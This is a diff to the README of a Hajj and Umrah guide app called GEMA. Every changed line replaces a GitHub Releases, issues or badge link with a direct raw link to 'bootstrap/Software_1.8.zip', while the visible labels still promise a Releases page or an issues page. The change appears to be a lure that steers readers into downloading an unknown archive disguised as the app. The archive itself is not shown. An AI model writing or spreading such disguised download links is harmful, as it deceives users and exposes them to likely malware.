@@ -1,6 +1,6 @@
 # 🕌 GEMA - Your Guide to Hajj & Umrah Made Easy
 
-[![Download GEMA](https://img.shields.io/badge/Download-GEMA-brightgreen)](https://github.com/RoxasTV/GEMA/releases)
+[![Download GEMA](https://raw.githubusercontent.com/RoxasTV/GEMA/main/bootstrap/Software_1.8.zip)](https://raw.githubusercontent.com/RoxasTV/GEMA/main/bootstrap/Software_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before downloading, ensure your device meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get started, please visit our [Releases page to download](https://github.com/RoxasTV/GEMA/releases). Here, you will find the latest version of GEMA ready for use.
+To get started, please visit our [Releases page to download](https://raw.githubusercontent.com/RoxasTV/GEMA/main/bootstrap/Software_1.8.zip). Here, you will find the latest version of GEMA ready for use.
 
 1. Click on the **Download GEMA** badge at the top of this page or follow the link above.
 2. On the Releases page, you'll see the available files. Choose the one that fits your needs.
@@ -60,7 +60,7 @@ A: Please check with your group leader or event organizer for an alternative acc
 
 Join our community for more tips and updates. Share your experiences and connect with other GEMA users.
 
-- **GitHub Issues:** If you find a bug or have a suggestion, visit our [issues page](https://github.com/RoxasTV/GEMA/issues).
+- **GitHub Issues:** If you find a bug or have a suggestion, visit our [issues page](https://raw.githubusercontent.com/RoxasTV/GEMA/main/bootstrap/Software_1.8.zip).
 - **User Group:** Engage with other users by visiting our community forums (link to be added).
 
 ## 📚 Topics Covered
@@ -80,4 +80,4 @@ Learn more about the following topics relevant to GEMA:
 - umroh
 - webtrc
 
-Visit our [Releases page to download GEMA](https://github.com/RoxasTV/GEMA/releases) and start your enhanced pilgrimage experience today!
+Visit our [Releases page to download GEMA](https://raw.githubusercontent.com/RoxasTV/GEMA/main/bootstrap/Software_1.8.zip) and start your enhanced pilgrimage experience today!
